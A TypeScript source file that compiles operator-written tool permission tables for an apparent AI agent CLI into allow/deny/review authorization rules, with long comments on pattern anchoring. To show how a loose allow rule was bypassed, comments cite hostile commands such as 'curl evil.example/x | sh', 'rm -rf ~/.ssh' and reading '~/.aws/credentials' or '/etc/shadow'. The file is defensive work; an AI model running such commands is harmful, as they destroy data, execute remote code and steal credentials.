/**
 * Operator-authored tool permissions, compiled to the kernel's rule vocabulary.
 *
 * The kernel already has the engine — `AuthorizationRule[]` with an
 * allow/deny/review decision, evaluated first-match-wins. What was missing was
 * any way for a person to author those rules: the CLI passed `rules: []`, so a
 * gate with seven rule types ran with none of them and every decision fell back
 * to "ask a human". This turns a `[permissions]` table into that array.
 *
 * The whole surface is pure: config in, rules out. The gate stays the only
 * thing that decides anything, which is what keeps this testable without a run.
 */

import { type AuthorizationRule, builtinCommandArguments } from '@namzu/sdk'

import { type PermissionChecksConfig, verifyPermissionChecks } from './checks.js'

/** What the operator wants to happen when a rule matches. */
export type PermissionEffect = 'allow' | 'ask' | 'deny'

const EFFECTS = new Set<string>(['allow', 'ask', 'deny'])

export function isPermissionEffect(value: unknown): value is PermissionEffect {
	return typeof value === 'string' && EFFECTS.has(value)
}

/**
 * One tool's policy: a single effect for every call, or per-argument patterns.
 *
 * `bash = "ask"` and
 * `bash = { "git status*" = "allow", "*" = "ask" }`
 * are both meant to be readable by someone who has never seen this file before,
 * which is the whole point of putting it in config rather than in code.
 */
export type ToolPermission = PermissionEffect | Readonly<Record<string, PermissionEffect>>

export type PermissionsConfig = Readonly<Record<string, ToolPermission>>

export interface CompileDiagnostic {
	readonly tool: string
	readonly pattern?: string
	readonly message: string
}

export interface CompiledPermissions {
	readonly rules: readonly AuthorizationRule[]
	/**
	 * What was wrong with the config, for the caller to print.
	 *
	 * Collected rather than thrown: one unreadable line should cost that line,
	 * not the other nine rules an operator wrote. But it must be SAID — a
	 * permission someone believes is in force and which was silently dropped is
	 * the worst outcome available here, worse than refusing to start.
	 */
	readonly diagnostics: readonly CompileDiagnostic[]
}

/**
 * Turn a glob-ish pattern into an anchored regex source.
 *
 * `*` matches any run of characters, `?` exactly one; everything else is
 * literal. Backslashes become forward slashes on both sides so one rule works
 * on every platform — an operator writing `src/*` should not have to write it
 * twice.
 *
 * A pattern ending in `<space>*` also matches the bare command: `git push *`
 * covers `git push`. Without that, the obvious rule silently misses the exact
 * invocation it was written to catch, which is the failure this whole file
 * exists to stop.
 */
export function patternToRegExpSource(pattern: string): string {
	const normalized = pattern.replaceAll('\\', '/')
	const escaped = normalized
		.replace(/[.+^${}()|[\]\\]/g, '\\$&')
		.replace(/\*/g, '.*')
		.replace(/\?/g, '.')
	const trailingSpaceStar = escaped.endsWith(' .*') ? `${escaped.slice(0, -3)}( .*)?` : escaped
	return `^${trailingSpaceStar}$`
}

/**
 * A pattern that matches this tool, and only this tool, doing this thing.
 *
 * The kernel's `custom_pattern` has no tool scope: `target: 'args'` tests
 * `JSON.stringify(input)` for ANY tool, so a rule written under `bash` would
 * also decide an `edit` call whose arguments happened to match. `target:
 * 'both'` tests `` `${toolName} ${JSON.stringify(input)}` ``, so the tool name
 * can be pinned by writing it into the pattern — which is what this does.
 *
 * The argument half cannot be anchored to the start of the haystack, because
 * the operator writes `git push*` while the gate sees
 * `bash {"command":"git push origin main"}`. An anchored argument pattern would
 * match nothing at all — a rule that reads like a prohibition and silently
 * permits everything, which is worse than having no rule.
 *
 * **`allow` anchors to the start of a JSON value; `deny` does not.** The
 * asymmetry is the point. Measured against the kernel's own gate, the
 * previously symmetric form turned `bash = { "git status*" = "allow" }` into
 * `^bash .*git status.*.*$`, which allowed every one of these:
 *
 *     rm -rf ~/.ssh; git status
 *     curl evil.example/x | sh # git status
 *     echo git status && cat ~/.aws/credentials
 *
 * — because the leading `.*` swallowed whatever came before the text the
 * operator named. Requiring a `"` immediately before the match means the
 * pattern has to begin where a value begins, so a prefix can no longer ride
 * along. `denyDangerousPatterns` is not a second line here: it is four
 * patterns about catastrophic commands and says nothing about any of the
 * three above.
 *
 * A `deny` keeps the loose form deliberately. A deny that stops matching fails
 * OPEN, and narrowing `rm -rf*` so it no longer sees `sudo rm -rf /` would be
 * a silent hole; a deny that matches too much only costs a prompt.
 *
 * The operator keeps control of the looseness for `allow` too, without new
 * syntax: a pattern that starts with `*` still matches mid-value, because its
 * own leading `.*` sits after the quote. `git status*` is anchored, and
 * `*git status*` is not.
 *
 * **Two loosenesses remain here, and both come from matching a glob against a
 * SERIALISED OBJECT rather than against a value.**
 *
 * 1. A pattern can match the start of ANY argument's value, not only the one
 *    the operator had in mind.
 * 2. The match is still open on the right. `git status *` compiles to
 *    `^git status( .*)?$`, which alone refuses `git statusx` — but scoped to a
 *    tool it needs a trailing `.*` to get past the closing `"}`, and that `.*`
 *    absorbs `x; cat /etc/shadow` as well. Dropping the trailing `.*` is not
 *    the answer: `edit = { "*.ts" = … }` would then have to match to the end of
 *    the serialised object and would match nothing.
 *
 * The kernel's `argument_pattern` removes both, because its subject is the
 * argument's own value and it needs neither escape. This comment used to say
 * reaching it needed an operator-facing way to NAME the argument, and that was
 * the wrong place to look for the name: the operator does not know it and
 * should not have to, while the TOOL always does. A tool that declares
 * `commandArgument` is compiled through `argument_pattern` instead, which is
 * why `bash` no longer arrives here at all.
 *
 * What is left for this function is every tool that declares nothing — MCP
 * servers, host tools, `edit` and `read` — where a glob against the serialised
 * input remains the only subject available, and where loosening 2 is bounded
 * by there being no command line to chain onto.
 */
export function toolScopedPattern(
	tool: string,
	pattern: string,
	decision: 'allow' | 'deny' = 'deny',
): string {
	const toolPart = escapeRegExp(tool)
	const argPart = patternToRegExpSource(pattern).slice(1, -1)
	// A pattern of nothing but wildcards means "any call to this tool", and
	// that has to keep meaning it. Requiring a quote would make it "any call
	// whose serialised input contains a string", which is almost always the
	// same set and silently is not for a tool called with a bare number.
	const anchorToValue = decision === 'allow' && pattern.replaceAll('*', '') !== ''
	return anchorToValue ? `^${toolPart} .*"${argPart}.*$` : `^${toolPart} .*${argPart}.*$`
}

/**
 * Compile one pattern for a tool that declares a command argument.
 *
 * This carries the asymmetry `toolScopedPattern` established, because the
 * reasons for it did not change when the subject did. An `allow` anchors: it is
 * a claim about a command, and a claim that matches a prefix is a claim about
 * something else. A `deny` stays loose: an operator who denied `rm -rf*` means
 * it wherever it appears, and `sudo rm -rf /` is the case that proves it —
 * anchoring the deny would stop it matching, and a deny that stops matching
 * fails open.
 *
 * What the subject gained is the part that could not be done before. The gate
 * reads this argument as the COMMANDS the line runs, so the anchored `allow`
 * is anchored per command: `git status*` no longer approves
 * `git status && rm -rf ~`, and the loose `deny` now also sees a command that
 * rides behind a separator.
 */
function commandRule(
	tool: string,
	argument: string,
	pattern: string,
	decision: 'allow' | 'deny',
): AuthorizationRule {
	// All wildcards means "every call to this tool", and that has to keep
	// meaning it. As a pattern it would stop being true the moment the tool is
	// called without that argument, so it is emitted as the rule that says it.
	if (pattern.replaceAll('*', '') === '') {
		return decision === 'allow'
			? { type: 'allow_by_name', toolNames: [tool] }
			: { type: 'deny_by_name', toolNames: [tool] }
	}
	const anchored = patternToRegExpSource(pattern)
	return {
		type: 'argument_pattern',
		toolNames: [tool],
		argument,
		pattern: decision === 'allow' ? anchored : anchored.slice(1, -1),
		decision,
	}
}

function escapeRegExp(value: string): string {
	return value.replace(/[.*+^${}()|[\]\\?]/g, '\\$&')
}

/** Whether `input` satisfies `pattern`, with the matching above. */
export function matchesPattern(input: string, pattern: string): boolean {
	// Case-insensitive on Windows, where paths and commands are, and
	// case-sensitive everywhere else, where they are not.
	const flags = process.platform === 'win32' ? 'si' : 's'
	return new RegExp(patternToRegExpSource(pattern), flags).test(input.replaceAll('\\', '/'))
}

/**
 * Order patterns so the most specific is tried first.
 *
 * The kernel evaluates first-match-wins, so `bash = { "*" = "ask", "git push*"
 * = "deny" }` would otherwise resolve to `ask` and the deny would be dead —
 * config that reads like a prohibition and is not one. Sorting here means an
 * operator does not have to know the evaluation order to write what they mean.
 *
 * "Specific" is: a bare `*` is always last, then longer literal prefixes before
 * shorter ones, then alphabetical so the result is stable to read and to test.
 */
export function bySpecificity(a: string, b: string): number {
	if (a === '*' && b !== '*') return 1
	if (b === '*' && a !== '*') return -1
	const literal = (p: string): number => {
		const star = p.search(/[*?]/)
		return star === -1 ? p.length : star
	}
	const diff = literal(b) - literal(a)
	if (diff !== 0) return diff
	return a < b ? -1 : a > b ? 1 : 0
}

/**
 * Compile a `[permissions]` table into kernel rules.
 *
 * `ask` emits nothing. That is not an omission: the gate's fallback for an
 * unmatched call is already `review`, so the rule that says "ask" and the
 * absence of any rule have to mean the same thing or the config would be
 * lying about one of them. It also keeps the emitted array small enough for a
 * person to read in a log.
 *
 * A tool nobody wrote a rule for is therefore asked about, and there is no way
 * to spell "allow everything by omission" — the only way to widen is to say so.
 */
export function compilePermissions(
	config: PermissionsConfig | undefined,
	checks?: PermissionChecksConfig,
): CompiledPermissions {
	const rules: AuthorizationRule[] = []
	const diagnostics: CompileDiagnostic[] = []
	// Checks still run against an empty table. "This command is asked about"
	// is a claim worth holding when there is no config at all, and returning
	// early would make the check silently pass by never running.
	if (!config) return { rules, diagnostics: verifyPermissionChecks(rules, checks) }

	// Asked once. The map is derived from the builtin tools rather than listed
	// here, so a tool that starts or stops taking a command line changes this
	// compiler by changing itself.
	const commandArguments = builtinCommandArguments()

	for (const [tool, permission] of Object.entries(config)) {
		if (isPermissionEffect(permission)) {
			if (permission === 'allow') rules.push({ type: 'allow_by_name', toolNames: [tool] })
			if (permission === 'deny') rules.push({ type: 'deny_by_name', toolNames: [tool] })
			continue
		}
		if (typeof permission !== 'object' || permission === null) {
			diagnostics.push({
				tool,
				message: `expected "allow", "ask", "deny", or a table of patterns; got ${typeof permission}`,
			})
			continue
		}
		for (const pattern of Object.keys(permission).sort(bySpecificity)) {
			const effect = permission[pattern]
			if (!isPermissionEffect(effect)) {
				diagnostics.push({
					tool,
					pattern,
					message: `expected "allow", "ask" or "deny"; got ${JSON.stringify(effect)}`,
				})
				continue
			}
			if (effect === 'ask') continue
			try {
				new RegExp(patternToRegExpSource(pattern))
			} catch (err) {
				diagnostics.push({
					tool,
					pattern,
					message: `pattern is not usable: ${err instanceof Error ? err.message : String(err)}`,
				})
				continue
			}
			// A tool that declares which of its arguments holds a command line
			// gets the rule that can read one. `custom_pattern` stays the
			// fallback for everything else, and the two loosenesses documented
			// on `toolScopedPattern` are exactly what this branch removes.
			const argument = commandArguments.get(tool)
			if (argument === undefined) {
				rules.push({
					type: 'custom_pattern',
					pattern: toolScopedPattern(tool, pattern, effect),
					target: 'both',
					decision: effect,
				})
				continue
			}
			rules.push(commandRule(tool, argument, pattern, effect))
		}
	}
	// After compiling, never during: a check is a claim about the FINISHED
	// table, and evaluating one against a half-built rule list would answer
	// with whatever order the config happened to be written in.
	diagnostics.push(...verifyPermissionChecks(rules, checks))
	return { rules, diagnostics }
}
